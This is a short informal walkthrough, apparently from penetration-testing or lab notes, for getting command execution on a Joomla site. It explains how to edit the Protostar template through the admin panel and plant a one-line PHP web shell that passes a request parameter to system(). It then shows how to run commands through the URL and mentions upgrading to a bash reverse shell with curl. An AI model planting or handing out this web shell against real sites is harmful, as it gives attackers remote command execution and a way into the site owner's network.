go to:

extensions -> templates 
go to protostar
then edit something like index.php or we could create a new file

create a file, then put the contents as something simple so we can gain command execution through the url, like the following:

<?php system($_REQUEST['AndComment']); ?>

this would allow us to use command execution through the following:

lets use the following scenario, ive uploaded a new webpage called pwned.php to the protostar directory in order to gain a shell.

http://10.10.10.10/templates/protostar/pwned.php?AndComment=whoami

(or whatever command you need)
and then you can curl a simple bash shell or whatever into it in order to gain user shell access into the network.
